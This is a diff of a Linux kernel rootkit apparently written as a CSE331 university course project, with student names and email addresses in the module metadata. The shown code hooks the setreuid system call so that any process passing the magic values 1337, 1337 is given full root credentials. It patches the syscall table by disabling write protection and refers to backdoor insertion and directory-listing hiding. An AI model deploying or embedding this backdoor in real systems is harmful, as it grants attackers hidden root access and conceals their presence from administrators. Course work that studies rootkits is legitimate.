@@ -20,21 +20,25 @@
 
 
 MODULE_LICENSE("GPL") ;
-MODULE_AUTHOR("Brendan<brendanfoley1214@gmail.com>") ;
-MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
-MODULE_VERSION("0.3");
+MODULE_AUTHOR("Brendan<brendan.foley@stonybrook.edu>, Brian<brian.j.lee@stonybrook.edu," +
+	      "Carlos<carlos.lopez@stonybrook.edu, Marc<marc.darita@stonybrook.edu") ;
+MODULE_DESCRIPTION("Rootkit for CSE331") ;
+MODULE_VERSION("1.0");
 
 void **sys_call_address; // Pointer to the sys_call_table	
 
-
+// Begin Brendan
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
 asmlinkage long our_setreuid(const struct pt_regs *regs){
-	struct cred *creds;
+	struct cred *creds;		// New set of Credentials to be implemented
+	// Special int types to set our creds to 0 (root)
 	kuid_t zeroUID = KUIDT_INIT(0);
 	kgid_t zeroGID = KGIDT_INIT(0);
-
+	
+	// If process supplies specific argument values, they must want to elevate to root and be malicious
 	if((regs->si == 1337) && (regs->di == 1337)){
-		creds = prepare_creds();
+		creds = prepare_creds();	// Get creds initialized
+		// R00T 3V3RYTH1NG
 		creds->uid = zeroUID;
 		creds->gid = zeroGID;
 		creds->euid = zeroUID;
@@ -43,12 +47,14 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 		creds->sgid = zeroGID;
 		creds->fsuid = zeroUID;
 		creds->fsgid = zeroGID;
-		commit_creds(creds);
-		return 0;
+		
+		commit_creds(creds);		// Commit credentials of our process
+		return 0;			// Return success
 	}
-	
+	// Otherwise fall through and do a boring, normal setreuid
 	return old_setreuid(regs->si, regs->di);
 }
+// End Brendan
 
 // Start Marc - Inserting/removing backdoor & hide backdoor entrance
 void add_backdoor(char *path) {
@@ -328,7 +334,6 @@ static void __exit rootkit_exit(void){
 	sys_call_address[__NR_getdents] = original_getdents;
 	sys_call_address[__NR_setreuid] = old_setreuid;
 	write_cr0(read_cr0() | 0x10000); // This will make the sys call table read only again
-	printk(KERN_INFO "Old setreuid inserted");
 	printk(KERN_INFO "Rootkit Unloaded\n");
 	if(kern_path("/proc", 0, &p))
         	return;
